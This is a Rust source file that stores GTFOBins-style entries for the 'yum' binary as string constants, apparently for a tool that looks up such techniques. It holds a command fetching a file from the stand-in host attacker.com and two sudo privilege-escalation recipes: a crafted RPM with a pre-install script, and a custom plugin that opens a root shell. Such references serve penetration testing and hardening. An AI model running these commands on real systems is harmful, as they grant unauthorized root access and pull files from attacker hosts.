pub static BIN_NAME: &'static str = "yum";
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.";
pub static FD_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RFILE=file_to_get.rpm
    yum install http://$RHOST/$RFILE
"#;
pub static SUDO_DESC_1: &'static str = "It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.";
pub static SUDO_CODE_1: &'static str = r#"
    
    TF=$(mktemp -d)
    echo 'id' > $TF/x.sh
    fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
            
    sudo yum localinstall -y x-1.0-1.noarch.rpm
"#; // NOTE combined two code snippets here
pub static SUDO_DESC_2: &'static str = "Spawn interactive root shell by loading a custom plugin.";
pub static SUDO_CODE_2: &'static str = r#"
    
    TF=$(mktemp -d)
    cat >$TF/x<<EOF
    [main]
    plugins=1
    pluginpath=$TF
    pluginconfpath=$TF
    EOF

    cat >$TF/y.conf<<EOF
    [main]
    enabled=1
    EOF

    cat >$TF/y.py<<EOF
    import os
    import yum
    from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
    requires_api_version='2.1'
    def init_hook(conduit):
      os.execl('/bin/sh','/bin/sh')
    EOF

    sudo yum -c $TF/x --enableplugin=y
"#;
use crate::code::{Code, Tag};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
